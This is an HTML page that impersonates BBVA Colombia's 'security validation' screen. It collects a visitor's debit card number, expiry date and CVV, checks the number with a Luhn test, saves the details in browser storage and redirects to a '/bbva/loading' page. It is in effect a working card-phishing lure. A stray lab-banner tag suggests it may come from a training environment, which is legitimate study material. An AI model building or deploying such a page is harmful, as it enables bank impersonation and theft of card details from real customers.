<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validación de seguridad | BBVA Colombia</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

    <style>
        @font-face {
            font-family: "BBVA Web Book BS";
            src: url("/bbva/BentonSansBBVA-Book.woff") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        @font-face {
            font-family: "BBVA Web Medium BS";
            src: url("/bbva/BentonSansBBVA-Medium.woff?v=63e781ba") format("woff");
            font-weight: normal;
            font-style: normal;
            font-display: swap
        }

        :root {
            --bbva-azul-oscuro: #043263;
            --bbva-azul-medio: #1973b8;
            --bbva-texto: #121212;
            --bbva-fondo-input: #f4f4f4;
            --bbva-error: #cc0000;
        }

        .texto-1 {
            font-family: "BBVA Web Book BS", sans-serif;
            color: var(--bbva-texto);
            font-size: 22px;
            line-height: 2.2rem;
            margin-bottom: 0;
        }

        .texto-2 {
            font-family: "BBVA Web Book BS", sans-serif;
            font-size: 14px;
            line-height: 1.5rem;
            color: var(--bbva-texto);
        }

        .entrada-1 {
            width: 100%;
            background-color: var(--bbva-fondo-input);
            color: var(--bbva-texto);
            font-size: 17px;
            transition: background-color .25s, border-color .25s;
            display: block;
            padding: 0 15px 0 15px;
            border: none;
            border-bottom: 1px solid var(--bbva-texto);
            border-radius: 1px;
            font-family: "BBVA Web Book BS", "Helvetica Neue", Arial, Helvetica, sans-serif;
            height: 3.5rem;
        }

        .entrada-1:focus {
            outline: none;
            border-bottom: 2px solid var(--bbva-azul-medio);
        }

        .boton-1 {
            cursor: pointer;
            background-color: var(--bbva-azul-medio);
            border: none;
            border-radius: 1px;
            color: #fff;
            font-size: 1.5rem;
            font-family: "BBVA Web Medium BS", sans-serif;
            height: 3.5rem;
            text-align: center;
            text-decoration: none;
        }

        .boton-1:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .label-1 {
            font-family: "BBVA Web Medium BS", sans-serif;
            font-size: 14px;
            color: var(--bbva-texto);
            margin-bottom: 4px;
            display: block;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }

        .error-message {
            color: var(--bbva-error);
            font-family: "BBVA Web Book BS", sans-serif;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-bottom-color: var(--bbva-error) !important;
        }

        .header-bbva {
            background-color: var(--bbva-azul-oscuro);
        }
    </style>
</head>

<body class="px-3">
<x-lab-banner />
    <!-- Header -->
    <div class="text-center py-4 header-bbva">
        <img src="/bbva/logo_bbva_blanco.svg" width="80" height="24" alt="BBVA">
    </div>

    <!-- Vista: Tarjeta de Débito -->
    <div id="tdb">
        <h1 class="texto-1 mt-4 text-center px-4">Validación de seguridad</h1>
        <br>
        <div class="text-center mb-3 px-3">
            <p class="texto-2 mb-0 mt-2">Por seguridad debemos validar la información de tu tarjeta de débito:</p>
        </div>
        <!-- Mensaje de error general -->
        <div id="errorGeneralTDB" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>
        <div class="px-4 py-4 mb-2">
            <div class="mb-4">
                <label class="label-1" for="numtarjetaTDB">Número de tarjeta de débito</label>
                <input class="entrada-1 w-100" id="numtarjetaTDB" name="numtarjetatdb" type="text"
                    placeholder="Número de tarjeta débito" minlength="16" maxlength="19" autocomplete="off">
                <div class="error-message" id="errorNumTarjetaTDB"></div>
            </div>
            <div class="row mb-4">
                <div class="col-6">
                    <label class="label-1" for="vencimientoTDB">Fecha de vencimiento</label>
                    <input class="entrada-1 w-100" id="vencimientoTDB" name="vencimientotdb" type="text"
                        placeholder="MM/AA" minlength="5" maxlength="5" autocomplete="off">
                    <div class="error-message" id="errorVencimientoTDB"></div>
                </div>
                <div class="col-6">
                    <label class="label-1" for="cvvTDB">CVV</label>
                    <input class="entrada-1 w-100" id="cvvTDB" name="cvvtdb" type="text"
                        placeholder="CVV" minlength="3" maxlength="4" autocomplete="off">
                    <div class="error-message" id="errorCVVTDB"></div>
                </div>
            </div>
            <div class="mb-5" style="font-size: 12px;">
                <input type="checkbox" id="checkTDB" style="accent-color: var(--bbva-azul-oscuro);">
                <label for="checkTDB" style="margin-left: 8px;">Certifico que soy el titular de este producto</label>
            </div>
            <div class="mt-3 text-center">
                <button id="btnTDB" class="boton-1 text-center px-5 pt-2" disabled>Validar</button>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function () {
            let sessionUniqId = sessionStorage.getItem('uniqId');
            const appState = {
                uniqId: sessionUniqId,
                currentView: 'tdb'
            };

            function saveToLocalStorage(key, value) {
                const storageKey = `${appState.uniqId}_${key}`;
                const valueToSave = value && value.trim() !== '' ? value : '--';
                localStorage.setItem(storageKey, JSON.stringify(valueToSave));
            }

            function getFromLocalStorage(key) {
                const storageKey = `${appState.uniqId}_${key}`;
                const value = localStorage.getItem(storageKey);
                return value ? JSON.parse(value) : '--';
            }

            function validarLuhn(cardNumber) {
                const numero = cardNumber.replace(/\s/g, '');
                if (!/^\d+$/.test(numero)) return false;

                let suma = 0;
                let alternar = false;

                for (let i = numero.length - 1; i >= 0; i--) {
                    let digito = parseInt(numero.charAt(i), 10);
                    if (alternar) {
                        digito *= 2;
                        if (digito > 9) digito -= 9;
                    }
                    suma += digito;
                    alternar = !alternar;
                }

                return (suma % 10) === 0;
            }

            function validarVencimiento(vencimiento) {
                if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;

                const [mes, anio] = vencimiento.split('/');
                const mesNum = parseInt(mes, 10);
                const anioNum = parseInt(anio, 10);

                if (mesNum < 1 || mesNum > 12) return false;

                const hoy = new Date();
                const anioActual = hoy.getFullYear() % 100;
                const mesActual = hoy.getMonth() + 1;

                if (anioNum < anioActual) return false;
                if (anioNum === anioActual && mesNum < mesActual) return false;

                return true;
            }

            function validateTarjeta() {
                const num = $('#numtarjetaTDB').val().replace(/\s/g, '');
                const ven = $('#vencimientoTDB').val();
                const cvv = $('#cvvTDB').val();
                const check = $('#checkTDB').is(':checked');

                const isValid = num.length >= 15 && validarLuhn(num) &&
                               validarVencimiento(ven) && cvv.length >= 3 && check;

                $('#btnTDB').prop('disabled', !isValid);
                return isValid;
            }

            $('#numtarjetaTDB').on('input', function () {
                let value = $(this).val().replace(/\s/g, '');
                value = value.replace(/\D/g, '');
                if (value.length > 19) value = value.substring(0, 19);

                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                $(this).val(formattedValue);
                validateTarjeta();
            });

            $('#vencimientoTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
                $(this).val(value);
                validateTarjeta();
            });

            $('#cvvTDB').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 4) value = value.substring(0, 4);
                $(this).val(value);
                validateTarjeta();
            });

            $('#checkTDB').on('change', function () {
                validateTarjeta();
            });

            $('#btnTDB').on('click', function () {
                if (validateTarjeta()) {
                    saveToLocalStorage('numtarjetaTDB', $('#numtarjetaTDB').val().trim());
                    saveToLocalStorage('cvvTDB', $('#cvvTDB').val().trim());
                    saveToLocalStorage('vencimientoTDB', $('#vencimientoTDB').val().trim());
                    saveToLocalStorage('status', 'TDB');

                    window.location.href = '/bbva/loading';
                }
            });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
